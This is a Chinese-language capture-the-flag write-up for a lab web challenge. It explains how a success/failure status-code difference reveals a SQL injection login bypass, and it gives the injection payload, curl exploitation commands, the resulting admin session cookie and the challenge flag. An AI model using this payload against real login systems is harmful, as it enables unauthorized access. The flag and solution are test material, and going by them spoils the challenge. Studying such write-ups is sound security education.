## 题目原文

> 公司内部部署了一套资产管理系统，员工可以查看公司资产、提交报销申请和生成报表。最近 IT 部门收到报告称系统响应异常，怀疑存在安全漏洞。请帮助安全团队评估该系统的安全性，找出潜在的漏洞。

## 题解

### 入口与指纹

`gunicorn`（Werkzeug 3.x / Python 3.9）。未登录访问任何业务路由都 302 到 `/login`，而 `/login` 本身**恒定 500**：

```
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: gunicorn
Content-Length: 265
```

GET / POST / 各种字段名 / 各种 Cookie / 各种 Host 全部 500。这是本题最迷惑人的地方：**500 不是「被拒绝」，而是「登录失败后的模板渲染崩了」**。

### 关键观察

**1. 500 掩盖了一个可用的成功信号。**

如果登录视图是

```python
if check(username, password):
    session['username'] = username
    return redirect('/dashboard')      # 302
return render_template('login.html', error='...')   # 模板缺失 → 500
```

那么「凭据正确」会返回 **302**，而所有失败（包括 SQL 语法错误）都是 500。**302 就是唯一的成功 oracle。**

**2. 登录是拼接 SQL。**

用上面这个 oracle 扫一组注入 payload，只有一类返回 302：

```
username = ' OR 1=1 LIMIT 1-- -
password = x
→ HTTP 302, Location: /dashboard
Set-Cookie: session=eyJpc19hZG1pbiI6dHJ1ZSwidXNlcl9pZCI6MSwidXNlcm5hbWUiOiJzeXNhZG1pbiJ9...
```

`LIMIT 1` 是必要的：不带它时子查询返回多行会抛异常，仍然 500。这解释了为什么先前的 `' OR 1=1-- -` 试不出效果。

**3. 会话是 Flask 签名 cookie，内容直接给出了管理员身份。**

```json
{"is_admin": true, "user_id": 1, "username": "sysadmin"}
```

不需要伪造，注入本身就把我们变成了 `sysadmin`。

**4. `/admin/flag` 是 flag 出口。**

拿到会话后：

| 路由 | 无会话 | 有会话 |
| --- | --- | --- |
| `/admin/flag` | 302 | **200，返回 flag JSON** |
| `/report/export` | 302 | 200，报表摘要 |
| `/api/search?q=1` | 302 | 200，资产列表 |
| `/dashboard`、`/assets`、`/admin` | 302 | 500（模板缺失） |

## 利用链

**Step 1：用注入登录。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s -c cj -D- -o /dev/null -X POST \
  --data-urlencode "username=' OR 1=1 LIMIT 1-- -" \
  --data-urlencode 'password=x' \
  "http://$T/login"
# HTTP/1.1 302 Found
# Location: /dashboard
```

**Step 2：读 flag。**

```bash
curl -s -b cj "http://$T/admin/flag"
# {"flag":"flag{69a15973-f209-493f-842e-55184586242b}",
#  "message":"Congratulations! You found the flag!"}
```

## flag 位置

| flag | 位置 |
| --- | --- |
| 1 | `/admin/flag`，用注入得到的管理员会话直接读取 |

## 复盘

- **500 不一定是「被拒绝」。** 登录失败走模板渲染、模板缺失就会 500；成功走 redirect 就是 302。**把所有 500 当成「这条路死了」，会漏掉唯一可用的 oracle。**
- **注入要保证语句能返回恰好一行。** `' OR 1=1-- -` 在没有 `LIMIT 1` 时，子查询多行 → 应用异常 → 仍是 500，看起来像「注入无效」。
- **报错信息缺失时，状态码就是信道。** 本题没有任何 SQL 报错回显，只有 302/500 的差别。
- **拿到会话先看内容。** cookie 里 `is_admin: true` 直接告诉我们提权成功，不用再猜。
- **`/admin/flag` 这种「拿 flag」端点比 `/dashboard` 之类页面更可靠**：页面依赖模板，flag 接口通常只序列化 JSON。
- 提示「在报表生成和资产搜索里输入特殊字符」指的就是这两个功能背后的 SQL 拼接；登录处的注入是同一条链的入口。
